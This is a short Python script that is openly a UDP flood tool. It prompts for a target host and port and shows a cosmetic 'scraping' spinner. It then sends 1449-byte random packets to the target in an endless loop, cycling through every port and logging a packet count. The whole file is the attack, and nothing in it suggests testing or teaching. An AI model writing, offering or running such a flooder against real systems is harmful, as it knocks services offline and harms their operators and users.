import sys
import os
import socket
from rich.console import Console
from time import sleep

def scraping(host, port):
    console = Console()
    datas = [f"Host: {host}", f"Port: {port}"]
    with console.status("[bold green]Scraping data...", spinner='aesthetic') as status:
        while datas:
            data = datas.pop(0)
            sleep(1)
            console.log(f"[green]Finish scraping data[/green] {data}")
        console.log(f'[bold][red]Done!')

def attack(host, port):
    try:
        sleep(1)
        counter = 0
        data = os.urandom(1449) 
        target = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            if port >= 65534:
                port = 1
            target.sendto(data,(host,port))
            if target.sendto:
                print(f"Packet nr. {counter}, Target host {host}, Target port {port}")
                port += 1
                counter += 1
            else:                           
                print(target.sendto)
    except KeyboardInterrupt:
        print("Keyboard Interrupt")
        sys.exit 
        
if __name__ == "__main__":
    host = input("Enter target url: ")
    port = input("Enter target port: ")
    port = int(port)
    scraping(host, port)
    attack(host, port)
